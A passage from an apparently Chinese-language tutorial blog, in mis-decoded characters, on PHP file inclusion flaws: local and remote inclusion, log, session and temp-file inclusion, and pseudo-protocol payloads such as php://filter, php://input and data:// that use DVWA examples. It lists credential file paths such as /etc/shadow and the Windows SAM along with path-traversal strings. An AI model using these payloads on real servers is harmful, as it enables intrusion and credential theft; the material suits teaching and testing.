alt="image-20230808144725186" style="zoom:80%;" /><p>å¯ä»¥çœ‹å‡ºï¼Œinclude()å‡½æ•°å¹¶ä¸åœ¨æ„è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ï¼Œåªè¦æœ‰phpä»£ç ï¼Œéƒ½ä¼šè¢«è§£æå‡ºæ¥ã€‚</p><p>ä¸Šä¼ äº†ä¸€jpgæ ¼å¼çš„ä¸€å¥è¯æœ¨é©¬ï¼Œå¦‚æœç½‘ç«™æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œjpgæ–‡ä»¶å°±å¯ä»¥è¢«å½“åšphpæ–‡ä»¶è§£æï¼Œæ‰€ä»¥è¿™å°±æ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´é€šå¸¸é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨ã€‚</p><h2 id="æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´-LFI"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´-LFI" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)</h2><p>èƒ½å¤Ÿæ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œæˆ‘ä»¬ç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)</p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808145244893.png" alt="image-20230808145244893" style="zoom:80%;" /><p>åŒæ—¶ä¹Ÿå¯ä»¥åˆ©ç”¨è¯¥ä»£ç ï¼Œè¯»å–ä¸€äº›æœ¬åœ°ç³»ç»Ÿçš„æ•æ„Ÿä¿¡æ¯</p><p>ä¾‹å¦‚ï¼š<code>C:\Windows\system.ini</code></p><ol><li>ä½¿ç”¨ç»åœ°è·¯å¾„ç›´æ¥è¯»å–:</li></ol><p><code>localhost/include.php?filename=C:\Windows\system.ini</code></p><ol start="2"><li>ä½¿ç”¨ç›¸å¯¹è·¯å¾„è¿›è¡Œè¯»å–:</li></ol><p>â€‹<code>./</code> è¡¨ç¤ºå½“å‰è·¯å¾„</p><p>â€‹<code>../</code> è¡¨ç¤ºä¸Šä¸€çº§è·¯å¾„ä½ç½®</p><p>ä¾‹å¦‚å½“å‰é¡µé¢æ‰€åœ¨è·¯å¾„ä¸º<code>C:\Apache24\htdocs\</code>ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨..&#x2F;é€€åˆ°Cç›˜å†è¿›è¡Œè®¿é—®ï¼Œæ„é€ è·¯å¾„å¦‚ä¸‹ï¼š<br><code>../../windows/system.ini</code></p><ol start="3"><li>å¸¸è§çš„æ•æ„Ÿç›®å½•ä¿¡æ¯è·¯å¾„:</li></ol><p>Windowsç³»ç»Ÿ:</p><ul><li>C:\boot.ini &#x2F;&#x2F;æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</li><li>C:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F;IISé…ç½®æ–‡ä»¶</li><li>C:\windows\repair\sam &#x2F;&#x2F;å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç </li><li>C:\ProgramFiles\mysql\my.ini &#x2F;&#x2F;Mysqlé…ç½®</li><li>C:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F;MySQL rootå¯†ç </li><li>C:\windows\php.ini &#x2F;&#x2F;phpé…ç½®ä¿¡æ¯</li></ul><p>Linux&#x2F;Unixç³»ç»Ÿ:</p><ul><li>&#x2F;etc&#x2F;password &#x2F;&#x2F;è´¦æˆ·ä¿¡æ¯</li><li>&#x2F;etc&#x2F;shadow &#x2F;&#x2F;è´¦æˆ·å¯†ç ä¿¡æ¯</li><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache2é»˜è®¤é…ç½®æ–‡ä»¶</li><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;è™šæ‹Ÿç½‘ç«™é…ç½®</li><li>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHPç›¸å…³é…ç½®</li><li>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apacheé…ç½®æ–‡ä»¶</li><li>&#x2F;etc&#x2F;my.conf &#x2F;&#x2F;mysqlé…ç½®æ–‡ä»¶</li></ul><h3 id="LFIæ¼æ´åˆ©ç”¨æŠ€å·§"><a href="#LFIæ¼æ´åˆ©ç”¨æŠ€å·§" class="headerlink" title="LFIæ¼æ´åˆ©ç”¨æŠ€å·§"></a>LFIæ¼æ´åˆ©ç”¨æŠ€å·§</h3><ol><li>é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨</li></ol><p>æœ‰æ—¶å€™æˆ‘ä»¬æ‰¾ä¸åˆ°æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ— æ³•ä¸Šä¼ webshellï¼Œå¯ä»¥å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æ ¼å¼çš„webshellåˆ°æœåŠ¡å™¨ï¼Œå†åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œè§£æã€‚</p><p>ä¾‹é¢˜ï¼š<code>DVWA File Upload</code></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç®€å•ä»‹ç»ä¸€ä¸‹è§£é¢˜æ€è·¯ï¼š</p><p>å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨å¯¹ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ã€å†…å®¹æ²¡æœ‰åšä»»ä½•çš„æ£€æŸ¥ã€è¿‡æ»¤ï¼Œå­˜åœ¨æ˜æ˜¾çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œç”Ÿæˆä¸Šä¼ è·¯å¾„åï¼ŒæœåŠ¡å™¨ä¼šæ£€æŸ¥æ˜¯å¦ä¸Šä¼ æˆåŠŸå¹¶è¿”å›ç›¸åº”æç¤ºä¿¡æ¯ã€‚</p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶é€šè¿‡èšå‰‘è¿›è¡Œè¿æ¥çˆ†ç ´ç›®å½•ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808154439463.png" alt="image-20230808154439463"></p><ol start="2"><li>åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶</li></ol><p><strong>åˆ©ç”¨æ¡ä»¶:</strong></p><ul><li>å¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»</li><li>çŸ¥é“æ—¥å¿—æ–‡ä»¶å­˜å‚¨ç›®å½•</li></ul><p><strong>æ³¨æ„:</strong></p><ul><li>ä¸€èˆ¬æƒ…å†µä¸‹æ—¥å¿—å­˜å‚¨ç›®å½•ä¼šè¢«ä¿®æ”¹ï¼Œéœ€è¦è¯»å–æœåŠ¡å™¨é…ç½®æ–‡ä»¶(httpd.conf,nginx,conf,â€¦â€¦)æˆ–è€…æ ¹æ®phpinfo()ä¸­çš„ä¿¡æ¯æ¥å¾—çŸ¥</li><li>æ—¥å¿—è®°å½•çš„ä¿¡æ¯éƒ½å¯ä»¥è¢«è°ƒæ•´ï¼Œæ¯”å¦‚è®°å½•æŠ¥é”™çš„ç­‰çº§ï¼Œæˆ–è€…å†…å®¹æ ¼å¼</li></ul><p>åœ¨ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå°†è¯·æ±‚å†™å…¥access.logï¼Œå½“å‘ç”Ÿé”™è¯¯æ—¶å°†é”™è¯¯å†™å…¥error.logï¼Œæ—¥å¿—æ–‡ä»¶å¦‚ä¸‹:</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808153750802.png" alt="image-20230808153750802"></p><p>æ­£å¸¸è®¿é—®ç½‘é¡µæ—¶ï¼Œaccessæ—¥å¿—ä¼šè¿›è¡Œè®°å½•ï¼Œå¦‚ä¸‹å›¾è®°å½•æ‰€ç¤ºï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808153929107.png" alt="image-20230808153929107"></p><h3 id="åŒ…å«sessionæ–‡ä»¶"><a href="#åŒ…å«sessionæ–‡ä»¶" class="headerlink" title="åŒ…å«sessionæ–‡ä»¶"></a>åŒ…å«sessionæ–‡ä»¶</h3><p>å¯ä»¥å…ˆæ ¹æ®å°è¯•åŒ…å«åˆ°SESSIONæ–‡ä»¶ï¼Œåœ¨æ ¹æ®æ–‡ä»¶å†…å®¹å¯»æ‰¾å¯æ§å˜é‡ï¼Œåœ¨æ„é€ payloadæ’å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæœ€ååŒ…å«å³å¯ã€‚</p><p><strong>åˆ©ç”¨æ¡ä»¶:</strong></p><ul><li>æ‰¾åˆ°Sessionå†…çš„å¯æ§å˜é‡</li><li>Sessionæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„</li></ul><p>phpçš„sessionæ–‡ä»¶çš„ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoçš„session.save_pathçœ‹åˆ°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808155049759.png" alt="image-20230808155049759"></p><p><strong>sessionå¸¸è§å­˜å‚¨è·¯å¾„:</strong></p><ul><li>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID</li><li>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID</li><li>&#x2F;tmp&#x2F;sess_PHPSESSID</li><li>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</li><li>sessionæ–‡ä»¶æ ¼å¼:sess_[phpsessid],è€Œphpsessidåœ¨å‘é€çš„è¯·æ±‚çš„cookieå­—æ®µä¸­å¯ä»¥çœ‹åˆ°ã€‚</li></ul><h3 id="åŒ…å«ä¸´æ—¶æ–‡ä»¶"><a href="#åŒ…å«ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="åŒ…å«ä¸´æ—¶æ–‡ä»¶"></a>åŒ…å«ä¸´æ—¶æ–‡ä»¶</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/e6618d373f0c467cb1a7fc6cb4b0046b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨&#x2F;tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨C:\windows\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤å‰ï¼Œå¯ä»¥åˆ©ç”¨æ—¶é—´ç«äº‰çš„æ–¹å¼åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚</p><p>ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„æ˜¯éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowsä¸‹åªæœ‰65535ç§ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚</p><p>å¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚</p><h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«-RFI" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)"></a>è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)</h2><p>å¦‚æœPHPçš„é…ç½®é€‰é¡¹<code>allow_url_include</code>ã€<code>allow_url_fopen</code>çŠ¶æ€ä¸ºONçš„è¯ï¼Œåˆ™<strong>include&#x2F;require</strong>å‡½æ•°æ˜¯å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶çš„ï¼Œè¿™ç§æ¼æ´è¢«ç§°ä¸ºè¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808155617492.png" alt="image-20230808155617492"></p><p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€æ®µä»£ç <code>include.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$path</span> . <span class="string">&#x27;/phpinfo.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>127.0.0.1/include.php/path=site</code>è®¿é—®æœ¬åœ°siteç›®å½•ä¸‹çš„phpinfo.phpæ–‡ä»¶:</p><p>è¯¥é¡µé¢å¹¶æ²¡æœ‰å¯¹$pathåšä»»ä½•è¿‡æ»¤ï¼Œå› æ­¤å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><p>æˆ‘ä»¬åœ¨è¿œç«¯WebæœåŠ¡å™¨&#x2F;site&#x2F;ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªtest.phpæ–‡ä»¶ï¼Œå†…å®¹ä¸ºphpinfo()ï¼Œåˆ©ç”¨æ¼æ´å»è¯»å–è¿™ä¸ªæ–‡ä»¶ã€‚</p><p>ä½†æ˜¯ä»£ç ä¼šç»™æˆ‘ä»¬è¾“å…¥çš„è·¯å¾„åé¢åŠ ä¸Šâ€™&#x2F;phpinfo.phpâ€™åç¼€ï¼Œå¦‚æœphpç‰ˆæœ¬å°äº5.3.4ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨%00æˆªæ–­ï¼Œè¿™é‡Œphpç‰ˆæœ¬ä¸º7.3.4ï¼Œä¸é€‚ç”¨ã€‚</p><p>è¿˜æœ‰ä¸€ç§æˆªæ–­æ–¹æ³•å°±æ˜¯?å·æˆªæ–­ï¼Œåœ¨è·¯å¾„åé¢è¾“å…¥?å·ï¼ŒæœåŠ¡å™¨ä¼šè®¤ä¸º?å·åé¢çš„å†…å®¹ä¸ºGETæ–¹æ³•ä¼ é€’çš„å‚æ•°ï¼ŒæˆåŠŸè¯»å–test.phpå¦‚ä¸‹ï¼š<br><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/5f410573f9664f12bff64166719a0592.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¦‚æœtest.phpæ˜¯æ¶æ„çš„webshellæ–‡ä»¶ï¼Œé‚£ä¹ˆåˆ©ç”¨è¯¥æ¼æ´å°±å¯ä»¥è·å–åˆ°æœåŠ¡å™¨æƒé™ã€‚</p><h2 id="PHPä¼ªåè®®"><a href="#PHPä¼ªåè®®" class="headerlink" title="PHPä¼ªåè®®"></a>PHPä¼ªåè®®</h2><p>PHPå†…ç½®äº†å¾ˆå¤šURLé£æ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äºç±»ä¼¼fopen()ã€copy()ã€file_exists()å’Œfilesize()çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</p><p>å¦‚ä¸‹æ‰€ç¤º<br><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/30b963c25bea48dcbc496cffb05d9989.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="1-file-åè®®"><a href="#1-file-åè®®" class="headerlink" title="1.file:&#x2F;&#x2F;åè®®"></a>1.file:&#x2F;&#x2F;åè®®</h3><p><strong>file:&#x2F;&#x2F;</strong> ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶çš„ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“<br><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/b36518ada13d4840adda715be02c8c57.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>file:&#x2F;&#x2F; [æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]<br><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/c7155542f0104f3588a3b809f5e30dbc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="2-php-åè®®"><a href="#2-php-åè®®" class="headerlink" title="2.php:&#x2F;&#x2F;åè®®"></a>2.php:&#x2F;&#x2F;åè®®</h3><p>php:&#x2F;&#x2F; è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµï¼ˆI&#x2F;O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯<code>php://filter</code>å’Œ<code>php://input</code><br><strong>php:&#x2F;&#x2F;filterç”¨äºè¯»å–æºç </strong>ã€‚<br><strong>php:&#x2F;&#x2F;inputç”¨äºæ‰§è¡Œphpä»£ç </strong>ã€‚</p><p><strong>php:&#x2F;&#x2F;filter</strong> è¯»å–æºä»£ç å¹¶è¿›è¡Œbase64ç¼–ç è¾“å‡ºï¼Œä¸ç„¶ä¼šç›´æ¥å½“åšphpä»£ç æ‰§è¡Œå°±çœ‹ä¸åˆ°æºä»£ç å†…å®¹äº†ã€‚<br><strong>åˆ©ç”¨æ¡ä»¶:</strong></p><ul><li>allow_url_fopen ï¼šoff&#x2F;on</li><li>allow_url_includeï¼šoff&#x2F;on</li></ul><p>ä¾‹å¦‚æœ‰ä¸€äº›æ•æ„Ÿä¿¡æ¯ä¼šä¿å­˜åœ¨phpæ–‡ä»¶ä¸­ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥åˆ©ç”¨æ–‡ä»¶åŒ…å«å»æ‰“å¼€ä¸€ä¸ªphpæ–‡ä»¶ï¼Œphpä»£ç æ˜¯ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„ï¼Œä¾‹å¦‚æ‰“å¼€å½“å‰ç›®å½•ä¸‹çš„2.php:<br><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/82059d24101a403b9f3b8e7769e4cf9f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»–åªæ˜¾ç¤ºäº†ä¸€æ¡è¯­å¥ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä»¥base64ç¼–ç çš„æ–¹å¼è¯»å–æŒ‡å®šæ–‡ä»¶çš„æºç :</p><p>è¾“å…¥<br><code>php://filter/convert.base64-encode/resource=æ–‡ä»¶è·¯å¾„</code><br>å¾—åˆ°2.phpåŠ å¯†åçš„æºç ï¼š<br><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/b667bf338aab4e82bcf72ad77472b3f0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å†è¿›è¡Œbase64è§£ç ï¼Œè·å–åˆ°2.phpçš„å®Œæ•´æºç ä¿¡æ¯ï¼š<br><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/65f354f2a2774be9b74c3f3940b8e0b3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>php:&#x2F;&#x2F;input</strong> å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ, å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp:&#x2F;&#x2F;input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚<br><strong>åˆ©ç”¨æ¡ä»¶:</strong></p><ul><li>allow_url_fopen ï¼šoff&#x2F;on</li><li>allow_url_includeï¼šon</li></ul><p>åˆ©ç”¨è¯¥æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™å…¥phpæ–‡ä»¶ï¼Œè¾“å…¥<code>file=php://input</code>ï¼Œç„¶åä½¿ç”¨burpæŠ“åŒ…ï¼Œå†™å…¥phpä»£ç ï¼š<br><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/b8cdd2c6e9a94365b64c58ef3f5c48ee.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘é€æŠ¥æ–‡ï¼Œå¯ä»¥çœ‹åˆ°æœ¬åœ°ç”Ÿæˆäº†ä¸€å¥è¯æœ¨é©¬ï¼š<br><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/c99b110b71cc4854a2cfc3821b6befe3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="3-ZIP-åè®®"><a href="#3-ZIP-åè®®" class="headerlink" title="3.ZIP:&#x2F;&#x2F;åè®®"></a>3.ZIP:&#x2F;&#x2F;åè®®</h3><p><strong>zip:&#x2F;&#x2F;</strong> å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><ul><li>zip:&#x2F;&#x2F;ä¸­åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„ã€‚</li><li>è¦ç”¨#åˆ†å‰²å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸”#è¦ç”¨urlç¼–ç æˆ%23(å³ä¸‹è¿°POCä¸­#è¦ç”¨%23æ›¿æ¢ï¼‰</li><li>åªéœ€è¦æ˜¯zipçš„å‹ç¼©åŒ…å³å¯ï¼Œåç¼€åå¯ä»¥ä»»æ„æ›´æ”¹ã€‚</li><li>ç›¸åŒçš„ç±»å‹è¿˜æœ‰zlib:&#x2F;&#x2F;å’Œbzip2:&#x2F;&#x2F;</li></ul><p><strong>åˆ©ç”¨æ¡ä»¶:</strong></p><ul><li>allow_url_fopen ï¼šoff&#x2F;on</li><li>allow_url_includeï¼šoff&#x2F;on</li></ul><p>POCä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip:<span class="comment">//[å‹ç¼©åŒ…ç»å¯¹è·¯å¾„]#[å‹ç¼©åŒ…å†…æ–‡ä»¶]?file=zip://D:\1.zip%23phpinfo.txt</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/7f04b0e59fda44cdb669d99fa315410b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="4-data-åè®®"><a href="#4-data-åè®®" class="headerlink" title="4.data:&#x2F;&#x2F;åè®®"></a>4.data:&#x2F;&#x2F;åè®®</h3><p><strong>data:&#x2F;&#x2F;</strong> åŒæ ·ç±»ä¼¼ä¸php:&#x2F;&#x2F;inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data:&#x2F;&#x2F;æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>åˆ©ç”¨data:&#x2F;&#x2F; ä¼ªåè®®å¯ä»¥ç›´æ¥è¾¾åˆ°æ‰§è¡Œphpä»£ç çš„æ•ˆæœï¼Œä¾‹å¦‚æ‰§è¡Œphpinfo()å‡½æ•°ï¼š<br><strong>åˆ©ç”¨æ¡ä»¶:</strong></p><ul><li>allow_url_fopen ï¼šon</li><li>allow_url_includeï¼šon</li></ul><p>POCä¸º:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,&lt;?php phpinfo();?&gt;</span></span><br><span class="line"><span class="comment">//å¦‚æœæ­¤å¤„å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡base64ç¼–ç åå†è¾“å…¥ï¼š</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/fdf0d4eb7b9f4b40b4e22b6990162cb8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="5-ä¼ªåè®®åˆ©ç”¨æ¡ä»¶"><a href="#5-ä¼ªåè®®åˆ©ç”¨æ¡ä»¶" class="headerlink" title="5.ä¼ªåè®®åˆ©ç”¨æ¡ä»¶"></a>5.ä¼ªåè®®åˆ©ç”¨æ¡ä»¶</h3><p>ä¼ªåè®®çš„åˆ©ç”¨æ–¹æ³•è¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚<br>ä¼ªåè®®çš„ç”¨æ³•å°ç»“<br><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/4737e3fbbbae4ebda4d419264e9e556c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æ–‡ä»¶åŒ…å«æ¼æ´é˜²æŠ¤"><a 